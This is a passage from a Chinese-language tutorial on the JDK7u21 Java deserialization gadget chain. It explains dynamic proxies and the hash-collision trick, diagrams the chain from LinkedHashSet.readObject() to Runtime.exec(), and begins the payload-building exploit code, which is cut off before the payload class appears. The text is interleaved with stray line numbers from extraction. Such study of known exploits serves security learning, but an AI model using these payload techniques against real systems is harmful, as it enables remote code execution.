    }
}
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
以上代码就是使⽤动态代理的⽅式，当为某个类或接⼝指定 InvocationHandler 对象时
（如： LawyerProxy ），那么在调⽤该类或接⼝⽅法时,就会去调⽤指定 handler 的 invok
e() ⽅法（37⾏）。
运⾏结果如下图所示：
5、hash碰撞
所谓的 hash 碰撞是指两个不同的字符串计算得到的 Hash 值相同。
如在国外社区上就有⼈给出了以下计算 hash 值为 0 的代码：
public class hashtest {
    public static void main(String[] args){
        long i = 0;
        loop: while(true){
            String s = Long.toHexString(i);
            if(s.hashCode() == 0){
                System.out.println("Found: '"+s+"'");
               // break loop;
            }
            if(i % 1000000==0){
1
2
3
4
5
6
7
8
9
10
11
12
运⾏后会得到 hash 值为 0 的字符串，如下图所示:
0x04 jdk7u21 payload
整个gadget链：
             //   System.out.println("checked: "+i);
            }
            i++;
        }
    }
}
13
14
15
16
17
18
Found: 'f5a5a608'
Found: '38aeaf9a6'
Found: '4b463c929'
Found: '6d49bc466'
Found: '771ffcd3a'
Found: '792e22588'
Found: '84f7f1613'
Found: '857ed38ce'
Found: '9da576938'
Found: 'a84356f1b'
1
2
3
4
5
6
7
8
9
10
终点（要达到的⽬标）：Runtime.exec()
         ||
TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
         ||
 AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
         ||
Proxy(Templates).equals()
         ||
Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)      
          AnnotationInvocationHandler.hashCodeImpl() (X)
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
          ||
 LinkedHashSet.add()
          ||
起点（要读取的内容）： LinkedHashSet.readObject()
19
20
21
22
23
24
25
package src.main.java;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashSet;
import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
class Reflections {
    public static Field getField(final Class clazz, final String fieldName) throws Exception {
        Field field = clazz.getDeclaredField(fieldName);
        if (field != null)
            field.setAccessible(true);
        else if (clazz.getSuperclass() != null)
            field = getField(clazz.getSuperclass(), fieldName);
        return field;
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
        field.set(obj, value);
    }
    public static Constructor getFirstCtor(final String name) throws Exception {
        final Constructor ctor = Class.forName(name).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        return ctor;
    }
}
class ClassFiles {
    public static String classAsFile(final Class clazz) {
        return classAsFile(clazz, true);
    }
    public static String classAsFile(final Class clazz, boolean suffix) {
        String str;
        if (clazz.getEnclosingClass() == null) {
            str = clazz.getName().replace(".", "/");
        } else {
            str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
        }
        if (suffix) {
            str += ".class";
        }
        return str;
    }
    public static byte[] classAsBytes(final Class clazz) {
        try {
            final byte[] buffer = new byte[1024];
            final String file = classAsFile(clazz);
            final InputStream in = ClassFiles.class.getClassLoader().getResourceAsStream(file);
            if (in == null) {
                throw new IOException("couldn't find '" + file + "'");
            }
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }
            return out.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83